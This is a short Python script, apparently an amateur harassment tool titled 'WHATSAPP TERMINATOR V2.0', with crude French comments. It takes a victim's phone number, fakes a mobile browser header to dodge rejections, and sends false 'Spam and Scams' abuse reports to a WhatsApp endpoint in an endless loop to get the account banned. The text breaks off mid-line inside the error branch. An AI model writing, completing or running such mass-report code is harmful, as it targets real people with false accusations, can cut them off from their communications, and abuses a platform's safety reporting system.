import requests
import time

# Créé par 𝐑𝐄𝐁𝐄𝐋𝐋𝐄 𝐌𝐀𝐒𝐐𝐔𝐄 🖕🔥
print("--- WHATSAPP TERMINATOR V2.0 ---")
target = input("Entrez le numéro (ex: +243...): ")

# Simulation d'un navigateur pour bypasser le code 400
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json'
}

# Payload de rapport (C'est ici qu'on les baise)
data = {
    "target_number": target,
    "reason": "Spam and Scams",
    "source": "Android_App"
}

# Boucle de destruction massive 💣
count = 0
while True:
    try:
        # Remplace l'URL ci-dessous par l'endpoint de report que tu utilises
        response = requests.post("https://api.whatsapp.com/report_spam", json=data, headers=headers)
        
        if response.status_code == 200 or response.status_code == 201:
            count += 1
            print(f"[+] Rapport {count} envoyé avec succès ! 💣🖕")
        else:
            print(f"[-] Erreur {response.status_code} - Ils résistent, ces
